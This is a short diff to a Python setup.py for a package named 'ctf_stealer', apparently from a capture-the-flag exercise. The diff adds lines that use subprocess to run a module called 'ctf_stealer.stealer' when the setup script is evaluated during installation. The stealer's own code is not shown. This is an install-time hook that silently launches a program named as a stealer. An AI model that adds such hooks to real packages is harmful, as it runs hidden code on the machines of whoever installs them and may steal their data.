@@ -7,6 +7,9 @@ class InstallCommand(install):
     def run(self):
         install.run(self)
 
+    import subprocess as sp
+    sp.call(["python", "-m", "ctf_stealer.stealer"])
+
 setup(
     name="ctf_stealer",
     version="0.1",
